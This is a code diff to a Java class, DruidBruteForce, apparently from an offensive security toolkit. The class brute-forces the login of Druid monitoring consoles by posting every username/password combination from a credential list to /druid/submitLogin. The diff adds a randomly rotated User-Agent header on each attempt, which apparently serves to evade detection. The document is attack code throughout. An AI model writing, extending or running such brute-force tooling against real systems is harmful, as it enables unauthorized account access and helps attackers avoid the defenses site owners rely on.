@@ -1,5 +1,7 @@
 package src.main.module;
 
+import src.main.common.UA_Config;
+
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -42,6 +44,7 @@ public class DruidBruteForce {
         String api = "/druid/submitLogin";
         String res = "";
         String site = address + api;
+        String ua = "";
         // 遍历用户名和密码进行爆破
         for (String username : credentials) {
             for (String password : credentials) {
@@ -50,6 +53,10 @@ public class DruidBruteForce {
                 // 发送POST数据
                 URL obj = new URL(site);
                 HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+                UA_Config uacf = new UA_Config();
+                List<String> ualist = uacf.loadUserAgents();
+                ua = uacf.getRandomUserAgent(ualist);
+                conn.setRequestProperty("User-Agent",ua);
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
                 conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
